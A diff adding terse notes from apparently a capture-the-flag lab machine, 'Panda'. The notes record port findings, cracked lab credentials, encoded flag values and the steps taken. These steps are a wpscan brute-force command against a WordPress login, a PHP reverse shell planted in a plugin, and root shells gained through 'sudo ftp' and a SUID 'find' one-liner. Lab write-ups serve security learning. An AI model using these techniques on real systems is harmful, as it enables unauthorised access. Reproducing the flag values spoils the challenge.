@@ -1,0 +1,43 @@
+Panda:
+22
+hydra found password
+shifu:batman
+flag.txt
+YzIzOGI2MzNkNTExOTM3NGYyMmQwNzk4Y2Q5ZDkzOGIK
+shifu 
+po has ssh keys in /home/po/.ssh
+tigress has ssh keys in /home/tigress/.ssh
+53
+80
+just a picture page
+found /flag
+5a4449794d4745314e475a694d6d59775a6a41344f4755335a5749324d7a526d5957526a5a4751354e32593d
+flag incorrect?
+/wordpress/
+full wordpress site, found wp-login
+wpscan --url panda.thm/wordpress/ --usernames /tmp/users --passwords /usr/share/wordlists/rockyou.txt
+po:password1
+po is wordpress admin
+wordpress admin
+put a php rev shell into hello dolly and activate it.
+139
+445
+1337
+Join the club, looks like a registration form
+3306
+priv esc
+shifu can execute ftp as sudo with no password
+sudo ftp
+!/bin/bash
+root
+suid bit is on find
+find . -exec /bin/sh -p \; -quit
+id = root
+flags
+No user or root flag
+/home/po/flag.txt
+MGNlMTZmYjFiYmM1ODY2OTczY2JlZmNlNjY4YTJmYTcK
+/home/shifu/flag.txt
+YzIzOGI2MzNkNTExOTM3NGYyMmQwNzk4Y2Q5ZDkzOGIK
+/home/tigress/flag.txt
+Mzk3NGRkYWFmM2RjM2ViOGU0NjZlNWQ2YjMyNDZjNWEK
